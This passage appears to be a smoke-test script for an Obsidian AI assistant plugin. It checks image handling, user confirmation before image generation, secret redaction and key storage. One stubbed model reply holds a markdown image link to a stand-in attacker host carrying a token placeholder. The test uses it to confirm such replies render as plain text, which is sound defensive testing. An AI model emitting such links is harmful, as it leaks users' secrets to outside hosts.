        const gut = await t.run("write_note", { path: a, content: "Ordner <0xF0><0x9F><0x97><0x82> und Koda<0xE2><0x80><0xAF>Dashboard, Hex <0x0A> bleibt", mode: "create" });
        const f = app.vault.getAbstractFileByPath(a);
        const text = f ? await app.vault.read(f) : null;
        const kaputt = await t.run("write_note", { path: b, content: "abgeschnitten <0xF0><0x9F> hier", mode: "create" });
        return { vorher: false, gut, text, kaputt, kaputtDa: app.vault.getAbstractFileByPath(b) !== null };
      `);
      eigen52 = !r52.vorher;
      if (r52.vorher) {
        detail52 = "smoke52-Dateien existieren schon (Rest eines abgebrochenen Laufs?) — nicht gemessen, bitte von Hand entfernen";
      } else {
        const soll = "Ordner \u{1F5C2} und Koda Dashboard, Hex <0x0A> bleibt";
        const dekodiert = r52.text === soll;
        const abgelehnt = r52.kaputt?.ok === false && r52.kaputtDa === false && /<0xF0><0x9F>/.test(r52.kaputt.error ?? "");
        ok52 = r52.gut?.ok === true && dekodiert && abgelehnt;
        detail52 = `Datei enthält ${dekodiert ? "🗂, U+202F und das literale <0x0A>" : `FALSCH: ${JSON.stringify(r52.text)}`} · `
          + `unvollständige Folge ${abgelehnt ? "abgelehnt, keine Datei" : `NICHT abgelehnt (ok=${r52.kaputt?.ok}, Datei da=${r52.kaputtDa})`}`;
      }
    } catch (error) {
      detail52 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
    } finally {
      if (eigen52) await cdp.evaluate(`
        for (const f of ${JSON.stringify([W52, W52b])}) { const x = app.vault.getAbstractFileByPath(f); if (x) await app.vault.delete(x, true); }
        return true;
      `).catch(() => undefined);
    }
    record("53. Byte-Token-Guard: <0xF0><0x9F><0x97><0x82> landet als 🗂 in der Datei, eine abgeschnittene Folge wird abgelehnt", ok52, detail52);

    // --- 54. Kontextfenster-Hinweis (Welle 14): Notice mit „Uebernehmen", Koda ueberschreibt nichts ---
    // Der Teil, den kein Unit-Test sieht: `createFragment` im echten Renderer, die Notice im DOM und
    // der Klick, der die Einstellung schreibt. Ein eindeutiger Modellname (Schluessel der
    // Einmal-Pruefung) und ein ersetztes `probeContext` halten das Netz heraus. Die Einstellung
    // wird vorher gemerkt und im `finally` zurueckgesetzt.
    let detail53 = "nicht gelaufen";
    let ok53 = false;
    const vorher53 = await cdp.evaluate<number>(`return app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings.contextWindowTokens;`);
    try {
      const r53 = await cdp.evaluate<{
        vorBesitz: number;
        nachWarnung: number;
        text: string;
        knopf: string;
        nachKlick: number;
        bestaetigung: boolean;
        nochmal: number;
      }>(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        p.probeContext = async () => null;
        p.settings.contextWindowTokens = 260000;
        const sichtbar = () => [...document.querySelectorAll(".notice")];
        const ep = { url: "http://127.0.0.1:1/smoke53", apiKey: "" };
        await p.checkContextWindow(ep, "smoke53", "smoke53-ctx64k");
        const warn = sichtbar().find((n) => n.textContent.includes("65536"));
        const text = warn ? warn.textContent : "";
        const btn = warn ? warn.querySelector("button") : null;
        const knopf = btn ? btn.textContent : "";
        const nachWarnung = p.settings.contextWindowTokens;
        if (btn) btn.click();
        await new Promise((r) => setTimeout(r, 200));
        const nachKlick = p.settings.contextWindowTokens;
        const bestaetigung = sichtbar().some((n) => n.textContent.includes("65536") && !n.querySelector("button"));
        const vorAnzahl = sichtbar().length;
        await p.checkContextWindow(ep, "smoke53", "smoke53-ctx64k");
        return { vorBesitz: 260000, nachWarnung, text, knopf, nachKlick, bestaetigung, nochmal: sichtbar().length - vorAnzahl };
      `);
      ok53 = r53.text.includes("65536") && r53.text.includes("260000") && r53.nachWarnung === 260000
        && r53.knopf.includes("65536") && r53.nachKlick === 65536 && r53.bestaetigung && r53.nochmal === 0;
      detail53 = `Notice „${r53.text.slice(0, 80)}…“ · Knopf „${r53.knopf}“ · Einstellung vor Klick ${r53.nachWarnung} (unverändert: ${r53.nachWarnung === 260000}), nach Klick ${r53.nachKlick} · `
        + `Bestätigung ${r53.bestaetigung} · zweiter Aufruf ${r53.nochmal === 0 ? "schweigt" : `MELDET ERNEUT (${r53.nochmal})`}`;
    } catch (error) {
      detail53 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
    } finally {
      await cdp.evaluate(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        delete p.probeContext;
        p.settings.contextWindowTokens = ${JSON.stringify(vorher53)};
        await p.saveSettings();
        return true;
      `).catch(() => undefined);
      await clearNotices(cdp).catch(() => undefined);
    }
    record("54. Kontextfenster-Hinweis: Notice mit Übernehmen-Knopf, Einstellung bleibt bis zum Klick, zweiter Aufruf schweigt", ok53, detail53);

    // --- 55–58. Bilder ansehen und erzeugen (Welle 14) ---------------------------------------
    // Gemessen wird die Naht zum Host: Bild aus dem Vault lesen, als Data-URL in den Request
    // bringen, Plugin-Register der Anbieter. Modell und Anbieter sind Stubs — die Stubs tragen
    // die ID des ECHTEN Besitzers (`image-to-markdown`, `local-image-generator`), weil Koda nur
    // dort liest; existiert dort schon ein Eintrag, uebersprungen wie bei Punkt 43.
    const PNG_B64 = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==";
    const BILD = "Koda/smoke55.png";
    const setzeModell = (model: string, url: string): Promise<unknown> => cdp.evaluate(`
      const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
      p.settings.endpoints = [{ url: ${JSON.stringify(url)}, model: ${JSON.stringify(model)} }];
      await p.saveSettings();
      await p.newChat();
      return true;
    `);
    const legeBildAn = (): Promise<unknown> => cdp.evaluate(`
      if (!app.vault.getFolderByPath("Koda")) await app.vault.createFolder("Koda");
      const alt = app.vault.getFileByPath(${JSON.stringify(BILD)});
      if (alt) await app.vault.delete(alt);
      const bin = atob(${JSON.stringify(PNG_B64)});
      const bytes = new Uint8Array(bin.length);
      for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
      await app.vault.createBinary(${JSON.stringify(BILD)}, bytes.buffer);
      return true;
    `);
    const raeumeBildAuf = (): Promise<unknown> => cdp.evaluate(`
      const f = app.vault.getFileByPath(${JSON.stringify(BILD)});
      if (f) await app.vault.delete(f);
      return true;
    `).catch(() => undefined);
    const frageUndWarte = async (frage: string, fake: { bodies: unknown[] }, anzahl: number): Promise<void> => {
      await cdp.evaluate(`void app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].ask(${JSON.stringify(frage)}); return true;`);
      await pollUntil<boolean>(cdp, `return app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].busy ? null : true;`, 20_000);
      for (let i = 0; i < 40 && fake.bodies.length < anzahl; i++) await new Promise((r) => setTimeout(r, 250));
    };
    type Wire = { role: string; content: unknown };
    const toolNachricht = (b: { messages: Wire[] }): Wire | undefined => b.messages.find((m) => m.role === "tool");
    const installOcrStub = (text: string): Promise<unknown> => cdp.evaluate(`
      window.__kodaOcrSeen = [];
      app.plugins.plugins["image-to-markdown"] = { __kodaSmokeStub: true, api: { version: 1, extractText: async (p) => { window.__kodaOcrSeen.push(p); return ${JSON.stringify(text)}; } } };
      return true;
    `);
    const removeOcrStub = (): Promise<unknown> => cdp.evaluate(`
      if (app.plugins.plugins["image-to-markdown"]?.__kodaSmokeStub) delete app.plugins.plugins["image-to-markdown"];
      delete window.__kodaOcrSeen;
      return true;
    `).catch(() => undefined);
    const ocrVorher = await cdp.evaluate<boolean>(`return !!app.plugins.plugins["image-to-markdown"];`);
    const genVorher = await cdp.evaluate<boolean>(`return !!app.plugins.plugins["local-image-generator"];`);

    try {
      // ── 55: Vision-Kette — das Bild kommt als image_url-Part im Tool-Ergebnis an ──
      let ok55 = false; let detail55 = "nicht gelaufen";
      const fake55 = await startScriptedEndpoint((_b, n) => n === 1
        ? { toolCall: { name: "read_image", args: JSON.stringify({ path: BILD }) } }
        : { content: "Ich sehe ein rotes Pixel." });
      try {
        await legeBildAn();
        await setzeModell("google/gemma-4-e4b", fake55.url);
        await frageUndWarte("Was zeigt " + BILD + "?", fake55, 2);
        const b1 = fake55.bodies[0]; const b2 = fake55.bodies[1];
        const angeboten = b1?.tools?.some((t) => t.function.name === "read_image") === true;
        const tn = b2 === undefined ? undefined : toolNachricht(b2);
        const parts = Array.isArray(tn?.content) ? (tn.content as { type: string; image_url?: { url: string } }[]) : [];
        const url = parts.find((x) => x.type === "image_url")?.image_url?.url ?? "";
        const log = await cdp.evaluate<{ images: unknown; base64: boolean }>(`
          const log = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].chatLog;
          return { images: log.find((m) => m.role === "tool")?.images ?? null, base64: JSON.stringify(log).includes("base64") };
        `);
        ok55 = angeboten && url === `data:image/png;base64,${PNG_B64}` && parts[0]?.type === "text"
          && JSON.stringify(log.images) === JSON.stringify([{ path: BILD }]) && !log.base64;
        detail55 = `read_image in der Werkzeugliste: ${angeboten} · Tool-Ergebnis als Parts [${parts.map((x) => x.type).join(", ")}] · URL ${url === `data:image/png;base64,${PNG_B64}` ? "= Datei" : `ABWEICHEND (${url.slice(0, 40)})`} · Verlauf traegt ${JSON.stringify(log.images)}, Base64 im Verlauf: ${log.base64}`;
      } catch (error) {
        detail55 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
      } finally {
        await fake55.close();
      }
      record("55. Vision: read_image bringt das Bild als image_url-Part im Tool-Ergebnis, der Verlauf traegt nur den Pfad", ok55, detail55);

      // ── 56: OCR-Kette — ein Modell ohne Vision bekommt den erkannten Text ──
      if (ocrVorher) {
        record("56. OCR: read_image liefert dem Text-Modell den erkannten Text, ohne Anbieter fehlt das Werkzeug", true, "uebersprungen — ein image-to-markdown-Eintrag existiert bereits (echtes Plugin oder Rest eines abgebrochenen Laufs)");
      } else {
        let ok56 = false; let detail56 = "nicht gelaufen";
        const fake56 = await startScriptedEndpoint((_b, n) => n === 1
          ? { toolCall: { name: "read_image", args: JSON.stringify({ path: BILD }) } }
          : { content: "Die Rechnung hat die Nummer 42." });
        try {
          await installOcrStub("Smoke-Rechnung 42");
          await setzeModell("qwen/qwen3.8-27b", fake56.url);
          await frageUndWarte("Lies " + BILD, fake56, 2);
          const b2 = fake56.bodies[1];
          const tn = b2 === undefined ? undefined : toolNachricht(b2);
          const text = typeof tn?.content === "string" ? tn.content : "";
          const angeboten = fake56.bodies[0]?.tools?.some((t) => t.function.name === "read_image") === true;
          const gesehen = await cdp.evaluate<string[]>(`return window.__kodaOcrSeen;`);
          // Gegenstueck: Anbieter weg → das Werkzeug verschwindet aus der Liste, ein Aufruf meldet Klartext.
          await removeOcrStub();
          const ohne = await cdp.evaluate<{ names: boolean; run: string }>(`
            const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
            const r = await p.buildTools().run("read_image", { path: ${JSON.stringify(BILD)} });
            return { names: p.currentToolNames().includes("read_image"), run: r.ok ? "ok" : r.error };
          `);
          ok56 = angeboten && text.includes("Smoke-Rechnung 42") && !JSON.stringify(b2).includes("image_url")
            && gesehen.length === 1 && gesehen[0] === BILD && ohne.names === false && ohne.run !== "ok";
          detail56 = `Werkzeug angeboten: ${angeboten} · Tool-Ergebnis „${text.slice(0, 70).replace(/\s+/g, " ")}“ · image_url im Request: ${JSON.stringify(b2).includes("image_url")} · Anbieter gerufen mit ${JSON.stringify(gesehen)} · ohne Anbieter in der Liste: ${ohne.names}, Aufruf „${ohne.run.slice(0, 60)}“`;
        } catch (error) {
          detail56 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
        } finally {
          await fake56.close();
          await removeOcrStub();
        }
        record("56. OCR: read_image liefert dem Text-Modell den erkannten Text, ohne Anbieter fehlt das Werkzeug", ok56, detail56);
      }

      // ── 57: Bilderzeugung — frei im Koda-Ordner, sonst erst fragen (vor der Erzeugung) ──
      if (genVorher) {
        record("57. generate_image: im Koda-Ordner frei, sonst Rueckfrage VOR der Erzeugung, Ablehnung erzeugt nichts", true, "uebersprungen — ein local-image-generator-Eintrag existiert bereits");
      } else {
        let ok57 = false; let detail57 = "nicht gelaufen";
        try {
          await cdp.evaluate(`
            window.__kodaGenSeen = [];
            app.plugins.plugins["local-image-generator"] = { __kodaSmokeStub: true, api: { version: 1, generateImage: async (prompt, o) => { window.__kodaGenSeen.push({ prompt, folder: o.targetFolder }); return o.targetFolder + "/smoke57.png"; } } };
            return true;
          `);
          const angeboten = await cdp.evaluate<boolean>(`return app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].currentToolNames().includes("generate_image");`);
          const frei = await cdp.evaluate<{ r: { ok: boolean; content?: string }; modal: boolean }>(`
            const r = await app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].buildTools().run("generate_image", { prompt: "Smoke Hund" });
            return { r, modal: !!document.querySelector(".modal-container") };
          `);
          // Ausserhalb: das Modal erscheint, BEVOR der Anbieter gerufen wurde.
          const starte = (folder: string): Promise<unknown> => cdp.evaluate(`
            window.__kodaGen57 = null;
            app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].buildTools().run("generate_image", { prompt: "Smoke Logo", folder: ${JSON.stringify(folder)} }).then((r) => { window.__kodaGen57 = r; });
            return true;
          `);
          await starte("Projekte57");
          const modal = await pollUntil<string>(cdp, `const m = document.querySelector(".modal-container"); return m ? m.textContent : null;`, 8000);
          const vorClick = await cdp.evaluate<number>(`return window.__kodaGenSeen.length;`);
          await clickReal(cdp, `document.querySelector(".modal-container .modal-button-container button:last-child") ?? null`);
          const erlaubt = await pollUntil<{ ok: boolean; content?: string }>(cdp, `return window.__kodaGen57;`, 8000);
          await starte("Projekte57b");
          await pollUntil<boolean>(cdp, `return document.querySelector(".modal-container") ? true : null;`, 8000);
          await clickReal(cdp, `document.querySelector(".modal-container .modal-button-container button:first-child") ?? null`);
          const abgelehnt = await pollUntil<{ ok: boolean; error?: string }>(cdp, `return window.__kodaGen57;`, 8000);
          const seen = await cdp.evaluate<{ prompt: string; folder: string }[]>(`return window.__kodaGenSeen;`);
          ok57 = angeboten && frei.r.ok === true && (frei.r.content ?? "").includes("![[Koda/images/smoke57.png]]") && frei.modal === false
            && modal !== null && modal.includes("Smoke Logo") && modal.includes("Projekte57") && vorClick === 1
            && erlaubt?.ok === true && abgelehnt?.ok === false && abgelehnt.error === "vom Nutzer abgelehnt"
            && seen.length === 2 && seen[0].folder === "Koda/images" && seen[1].folder === "Projekte57";
          detail57 = `angeboten: ${angeboten} · Koda-Ordner: ${frei.r.ok ? `Embed ${(frei.r.content ?? "").includes("![[Koda/images/smoke57.png]]")}` : "FEHLER"}, Modal ${frei.modal} · ausserhalb: Modal mit Prompt+Ordner ${modal !== null && modal.includes("Smoke Logo") && modal.includes("Projekte57")}, Anbieter vor dem Klick gerufen: ${vorClick} Mal · nach Zustimmung ok ${erlaubt?.ok} · Ablehnung „${abgelehnt?.error}“ · Anbieter insgesamt ${JSON.stringify(seen.map((x) => x.folder))}`;
        } catch (error) {
          detail57 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
        } finally {
          await cdp.evaluate(`
            if (app.plugins.plugins["local-image-generator"]?.__kodaSmokeStub) delete app.plugins.plugins["local-image-generator"];
            delete window.__kodaGenSeen; delete window.__kodaGen57;
            return true;
          `).catch(() => undefined);
          await schliesseDialog(cdp).catch(() => undefined);
        }
        record("57. generate_image: im Koda-Ordner frei, sonst Rueckfrage VOR der Erzeugung, Ablehnung erzeugt nichts", ok57, detail57);
      }

      // ── 58: Vision-Fehler → Rueckfall auf Texterkennung ──
      if (ocrVorher) {
        record("58. Vision-Fehler: HTTP 400 nach einem Bild faellt auf Texterkennung zurueck, die Runde wiederholt sich", true, "uebersprungen — ein image-to-markdown-Eintrag existiert bereits");
      } else {
        let ok58 = false; let detail58 = "nicht gelaufen";
        const fake58 = await startScriptedEndpoint((b, n) => n === 1
          ? { toolCall: { name: "read_image", args: JSON.stringify({ path: BILD }) } }
          : JSON.stringify(b).includes("image_url")
            ? { status: 400, errorMessage: "image input is not supported" }
            : { content: "Laut Text: Rechnung 42." });
        try {
          await installOcrStub("Smoke-Rechnung 42");
          await setzeModell("google/gemma-4-e4b", fake58.url);
          await frageUndWarte("Lies " + BILD, fake58, 3);
          const [b2, b3] = [fake58.bodies[1], fake58.bodies[2]];
          const t3 = b3 === undefined ? undefined : toolNachricht(b3);
          const text3 = typeof t3?.content === "string" ? t3.content : "";
          const log = await cdp.evaluate<{ images: unknown; text: string; letzte: string }>(`
            const log = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].chatLog;
            const t = log.find((m) => m.role === "tool");
            return { images: t?.images ?? null, text: t?.content ?? "", letzte: log[log.length - 1]?.content ?? "" };
          `);
          ok58 = fake58.bodies.length === 3 && b2 !== undefined && JSON.stringify(b2).includes("image_url")
            && !JSON.stringify(b3).includes("image_url") && text3.includes("Smoke-Rechnung 42")
            && log.images === null && log.text.includes("Smoke-Rechnung 42") && log.letzte.includes("Rechnung 42");
          detail58 = `Anfragen ${fake58.bodies.length} · 2. mit image_url: ${b2 !== undefined && JSON.stringify(b2).includes("image_url")} (→ HTTP 400) · 3. ohne Bild, Text „${text3.slice(0, 60).replace(/\s+/g, " ")}“ · Verlauf geheilt: images ${JSON.stringify(log.images)} · Antwort „${log.letzte.slice(0, 40)}“`;
        } catch (error) {
          detail58 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
        } finally {
          await fake58.close();
          await removeOcrStub();
        }
        record("58. Vision-Fehler: HTTP 400 nach einem Bild faellt auf Texterkennung zurueck, die Runde wiederholt sich", ok58, detail58);
      }
    } finally {
      await raeumeBildAuf();
      await removeOcrStub();
    }

    // --- 59–62. Verbindungs-Bausteine des Kits (Welle 15, obsidian-kit 0.51.2) ----------------
    // Koda behaelt `createChatClient` und tauscht nur Einzelbausteine: Schwaerzung (Chat-Client),
    // Schluesselbund (Endpunkt-Liste/-Aufloesung) und Neutralisierung (Antwort-Rendering). Die
    // Naht zum Host, die kein Unit-Test sieht: was WIRKLICH auf den Draht geht und was im DOM steht.
    const TOKEN_KERN = "abc123def456ghi789";
    const TOKEN = `Bearer ${TOKEN_KERN}`;
    const modusVorher59 = await cdp.evaluate<string>(`return app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].contextMode;`);
    const labDa59 = await cdp.evaluate<boolean>(`return !!app.plugins.plugins["llm-lab"];`);
    try {
      // ── 59: Schwaerzung ueber edit_active_note — das Original kommt in die Notiz, der Draht sieht Platzhalter ──
      let ok59 = false; let detail59 = "nicht gelaufen";
      let ok62 = false; let detail62 = "nicht gelaufen";
      const fake59 = await startScriptedEndpoint((b, n) => {
        if (n !== 1) return { content: "Erledigt." };
        const ph = /\[redacted-token-\d+\]/.exec(JSON.stringify(b))?.[0] ?? "KEIN-PLATZHALTER";
        return { toolCall: { name: "edit_active_note", args: JSON.stringify({ path: "Notes/Project plan.md", mode: "replace_selection", text: `Auth: ${ph}` }) } };
      });
      try {
        await setzeModell("smoke-model", fake59.url);
        if (!labDa59) {
          await cdp.evaluate(`
            window.__kodaLab59 = [];
            app.plugins.plugins["llm-lab"] = { __kodaSmokeStub: true, api: { apiVersion: 4, status: () => ({ apiVersion: 4, recording: true }), log: (input) => { window.__kodaLab59.push(JSON.parse(JSON.stringify(input))); return "smoke59-" + window.__kodaLab59.length; } } };
            return true;
          `);
        }
        const idx = await cdp.evaluate<number>(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          ${SCENE_JS}
          ed.setLine(idx, ${JSON.stringify(`Authorization: ${TOKEN} gilt`)});
          await new Promise((r) => setTimeout(r, 200));
          ed.setSelection({ line: idx, ch: 15 }, { line: idx, ch: ${15 + TOKEN.length} });
          p.setContextMode("workspace");
          void p.ask("Ersetze die Markierung durch eine Zeile.");
          return idx;
        `);
        if (idx < 0) throw new Error("Kulisse nicht hergestellt");
        const modal = await pollUntil<boolean>(cdp, `return !!document.querySelector(".modal-container .koda-preview");`, 15_000);
        if (!modal) throw new Error("Bestaetigungs-Modal erschien nicht");
        await clickReal(cdp, `document.querySelector(".modal-container .modal-button-container button:last-child") ?? null`);
        await pollUntil<boolean>(cdp, `return app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].busy ? null : true;`, 20_000);
        for (let i = 0; i < 40 && fake59.bodies.length < 2; i++) await new Promise((r) => setTimeout(r, 250));
        const inhalt = await cdp.evaluate<string>(`return app.workspace.getMostRecentLeaf(app.workspace.rootSplit).view.editor.getValue();`);
        const [b1, b2] = [JSON.stringify(fake59.bodies[0] ?? {}), JSON.stringify(fake59.bodies[1] ?? {})];
        const ph = /\[redacted-token-\d+\]/.exec(b1)?.[0] ?? "";
        const toolArgs = (fake59.bodies[1]?.messages as { role: string; tool_calls?: { function: { arguments: string } }[] }[] | undefined)
          ?.find((m) => m.role === "assistant" && m.tool_calls !== undefined)?.tool_calls?.[0]?.function.arguments ?? "";
        ok59 = ph !== "" && !b1.includes(TOKEN_KERN) && inhalt.includes(`Auth: ${TOKEN}`)
          && fake59.bodies.length >= 2 && !b2.includes(TOKEN_KERN) && toolArgs.includes(ph);
        detail59 = `Platzhalter im 1. Body: ${ph !== "" ? ph : "FEHLT"} · Original im 1. Body: ${b1.includes(TOKEN_KERN)} · Notiz traegt „Auth: ${TOKEN}“: ${inhalt.includes(`Auth: ${TOKEN}`)} · `
          + `Anfragen ${fake59.bodies.length} · Original im 2. Body (auch tool_calls): ${b2.includes(TOKEN_KERN)} · Tool-Argumente der 2. Runde „${toolArgs.slice(0, 70)}“`;
        // ── 62: Lab-Payload entspricht dem Draht (Platzhalter, kein Original) ──
        if (labDa59) {
          ok62 = true; detail62 = "uebersprungen — ein llm-lab-Eintrag existiert bereits (echtes Plugin oder Rest eines abgebrochenen Laufs)";
        } else {
          const gesehen = await cdp.evaluate<unknown[]>(`return window.__kodaLab59 ?? [];`);
          const lab = JSON.stringify(gesehen);
          ok62 = gesehen.length >= 1 && !lab.includes(TOKEN_KERN) && lab.includes(ph) && ph !== "";
          detail62 = `Lab-Aufrufe ${gesehen.length} · Original im Lab-Payload: ${lab.includes(TOKEN_KERN)} · Platzhalter im Lab-Payload: ${ph !== "" && lab.includes(ph)}`;
        }
      } catch (error) {
        detail59 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
      } finally {
        await fake59.close();
        await cdp.evaluate(`
          const path = "Notes/Project plan.md";
          const leaf = app.workspace.getMostRecentLeaf(app.workspace.rootSplit);
          if (leaf && leaf.view?.file?.path === path) leaf.view.editor.setValue(${JSON.stringify(FIXTURE_NOTE)});
          if (app.plugins.plugins["llm-lab"]?.__kodaSmokeStub) delete app.plugins.plugins["llm-lab"];
          delete window.__kodaLab59;
          return true;
        `).catch(() => undefined);
        await schliesseDialog(cdp).catch(() => undefined);
      }
      record("59. Schwaerzung: edit_active_note mit Bearer-Token — der Draht sieht nur den Platzhalter (auch in den Tool-Argumenten der 2. Runde), die Notiz bekommt das Original", ok59, detail59);
      record("62. Lab-Telemetrie traegt den gesendeten Text (Platzhalter), nicht das Original", ok62, detail62);

      // ── 60: Schluesselbund — Klartext-Schluessel wandert beim Aufloesen, der Header traegt ihn trotzdem ──
      let ok60 = false; let detail60 = "nicht gelaufen";
      const KEY60 = "smoke-key-0123456789abcdef";
      const fake60 = await startScriptedEndpoint(() => ({ content: "Ok." }));
      try {
        const lese = (): Promise<string> => cdp.evaluate<string>(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          return await app.vault.adapter.read(p.manifest.dir + "/data.json");
        `);
        // Alter Bestand: Klartext in data.json (so lag es bis 0.21.x).
        await cdp.evaluate(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          p.settings.endpoints = [{ url: ${JSON.stringify(fake60.url)}, apiKey: ${JSON.stringify(KEY60)}, model: "smoke-model" }];
          await p.saveData(p.settings);
          p.resolver.invalidate();
          await p.newChat();
          return true;
        `);
        const vorher = (await lese()).includes(KEY60);
        const aufgeloest = await cdp.evaluate<string>(`return (await app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].resolver.resolve())?.config?.apiKey ?? "";`);
        const weg = await pollUntil<boolean>(cdp, `
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          const text = await app.vault.adapter.read(p.manifest.dir + "/data.json");
          return text.includes(${JSON.stringify(KEY60)}) ? null : true;
        `, 8000);
        const nachher = await lese();
        await frageUndWarte("Smoke: bitte antworten.", fake60, 1);
        ok60 = vorher && aufgeloest === KEY60 && weg === true && !nachher.includes(KEY60) && nachher.includes("secretId")
          && fake60.authHeaders[0] === `Bearer ${KEY60}`;
        detail60 = `Klartext vorher in data.json: ${vorher} · aufgeloeste Config traegt den Schluessel: ${aufgeloest === KEY60} · nach dem Aufloesen in data.json: ${nachher.includes(KEY60)} (secretId da: ${nachher.includes("secretId")}) · `
          + `Authorization-Header am Endpunkt: ${fake60.authHeaders[0] === `Bearer ${KEY60}` ? "traegt den Schluessel" : `ABWEICHEND (${fake60.authHeaders[0] ?? "kein Aufruf"})`}`;
      } catch (error) {
        detail60 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
      } finally {
        await fake60.close();
      }
      record("60. Schluesselbund: Klartext-Schluessel verlaesst data.json beim Aufloesen, der Authorization-Header traegt ihn weiter", ok60, detail60);

      // ── 61: Neutralisierung — Bild-URL mit Platzhalter und dataviewjs-Block werden Text ──
      let ok61 = false; let detail61 = "nicht gelaufen";
      const fake61 = await startScriptedEndpoint(() => ({
        content: "Bild: ![x](https://evil.example/?d=[redacted-token-1])\n\n```dataviewjs\ndv.paragraph('X')\n```\n\nEnde.",
      }));
      try {
        await setzeModell("smoke-model", fake61.url);
        const misst = `
          const el = [...document.querySelectorAll(".koda-assistant")].pop();
          if (!el) return null;
          return { img: el.querySelectorAll("img").length, pre: el.querySelectorAll("pre").length, text: el.textContent.includes("dataviewjs") };
        `;
        await frageUndWarte("Smoke: Antwort mit Bild und Codeblock.", fake61, 1);
        await new Promise((r) => setTimeout(r, 800));
        const live = await cdp.evaluate<{ img: number; pre: number; text: boolean } | null>(misst);
        await cdp.evaluate(`for (const v of app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].views()) v.renderLog(); return true;`);
        await new Promise((r) => setTimeout(r, 800));
        const neu = await cdp.evaluate<{ img: number; pre: number; text: boolean } | null>(misst);
        const sauber = (m: { img: number; pre: number; text: boolean } | null): boolean => m !== null && m.img === 0 && m.pre === 0 && m.text;
        ok61 = sauber(live) && sauber(neu);
        detail61 = `waehrend/nach dem Lauf: ${JSON.stringify(live)} · nach Neuzeichnen des Verlaufs: ${JSON.stringify(neu)} (img 0, pre 0, „dataviewjs“ als Text)`;
      } catch (error) {
        detail61 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
      } finally {
        await fake61.close();
      }
      record("61. Neutralisierung: eine Antwort mit Bild-URL und dataviewjs-Block rendert als Text, auch im neu gezeichneten Verlauf", ok61, detail61);

      // --- 63. Globales Modell-Feld abgeschafft (Welle 17) --------------------------------------
      // Ein Altbestand mit `model` in data.json: nach dem Laden steht der Wert in der Zeile, der
      // Schluessel ist aus data.json verschwunden, und die Einstellungen zeigen weder eine Zeile
      // „Model“ noch die Option „global model“. Der Neustart des Plugins ist der Weg durch `onload`.
      let ok63 = false;
      let detail63 = "";
      let settings63: Cdp | null = null;
      try {
        await cdp.evaluate(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          await p.saveData({ endpoints: [{ url: "http://127.0.0.1:1234" }], model: "legacy-63" });
          await app.plugins.disablePlugin(${JSON.stringify(PLUGIN_ID)});
          await app.plugins.enablePlugin(${JSON.stringify(PLUGIN_ID)});
          return true;
        `);
        const nach = await pollUntil<{ roh: Record<string, unknown>; zeile: string | null; feld: boolean } | null>(
          cdp,
          `
            const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
            if (!p || !p.settings) return null;
            const roh = JSON.parse(await app.vault.adapter.read(p.manifest.dir + "/data.json"));
            return { roh, zeile: p.settings.endpoints[0]?.model ?? null, feld: "model" in p.settings };
          `,
          10000,
        );
        const gespeichert = nach !== null && !("model" in nach.roh) && (nach.roh.endpoints as Array<{ model?: string }>)[0]?.model === "legacy-63";
        await cdp.evaluate(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          if (p.views().length === 0) await p.activateView();
          app.setting.open();
          app.setting.openTabById(${JSON.stringify(PLUGIN_ID)});
          return true;
        `);
        await new Promise((r) => setTimeout(r, 1200));
        settings63 = await attachTo("settings", port, vault);
        const dom = settings63 === null
          ? null
          : await pollUntil<{ namen: string[]; global: boolean; zeilenModell: string } | null>(
              settings63,
              `
                const zeilen = [...document.querySelectorAll(".setting-item")].filter((r) => r.querySelector(".okit-ep-status"));
                if (zeilen.length === 0) return null;
                const namen = [...document.querySelectorAll(".setting-item-name")].map((e) => e.textContent.trim());
                const text = document.body.textContent.toLowerCase();
                const feld = zeilen[0].querySelector("input[type=text], select");
                return { namen, global: text.includes("global model"), zeilenModell: feld ? (feld.value ?? "") : "" };
              `,
              8000,
            );
        const keineZeile = dom !== null && !dom.namen.some((n) => n === "Model" || n === "Modell");
        ok63 = gespeichert && nach?.zeile === "legacy-63" && nach.feld === false && keineZeile && dom !== null && !dom.global;
        detail63 = `data.json ohne „model“, Zeile traegt legacy-63: ${gespeichert} · Feld im Speicher: ${nach?.feld} · Zeile „Model“ in den Einstellungen: ${dom === null ? "?" : !keineZeile} · „global model“ im Tab: ${dom?.global}`;
      } catch (error) {
        detail63 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
      } finally {
        settings63?.close();
